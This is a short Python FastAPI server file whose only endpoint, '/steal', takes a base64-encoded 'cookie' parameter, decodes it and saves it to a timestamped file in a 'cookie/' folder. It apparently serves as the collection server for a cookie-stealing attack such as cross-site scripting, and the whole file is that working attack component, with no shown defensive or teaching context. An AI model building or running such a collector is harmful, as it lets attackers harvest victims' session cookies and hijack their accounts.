from typing import Union
from datetime import datetime
import base64

from fastapi import FastAPI

app = FastAPI()


@app.get("/steal")
def read_root(cookie: str):
    encoded_bytes = cookie.encode("ascii")
    decoded_bytes = base64.b64decode(encoded_bytes)
    decoded_str = decoded_bytes.decode("ascii")
    write_file("cookie/" + get_current_time_str() + ".txt", decoded_str)
    return {}



def write_file(file_name: str, content: str):
    with open(file_name, "w") as file:
        file.write(content)


def get_current_time_str() -> str:
    now = datetime.now()
    return now.isoformat()

